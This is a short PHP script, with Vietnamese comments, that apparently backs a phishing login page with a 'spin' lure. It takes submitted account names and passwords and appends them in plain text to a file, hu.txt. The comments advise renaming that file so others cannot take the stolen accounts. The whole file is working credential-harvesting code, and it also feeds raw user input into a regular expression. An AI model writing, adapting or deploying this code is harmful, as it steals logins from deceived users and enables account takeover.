<?php
session_start();
if(isset($_SESSION['huongdz'])) {
		include 'logroi.php';
	}else{
	    	include 'chualog.php';
	}
	
if(isset($_POST["taikhoan"])){
    $acc = $_POST["taikhoan"];
    $pass = $_POST["matkhau"];
    
      $body = $acc."|".$pass."\n"; //định dạng acc|pass

     if(!preg_match('/'.$acc.'/', file_get_contents('hu.txt'))){ //đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
    $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
    fwrite($test,$body);
    fclose($test);
    
     }
    $_SESSION['huongdz'] = $acc;
$_SESSION['quay'] = 1;

     echo '<script>window.location.href="/"</script>';


}
?>


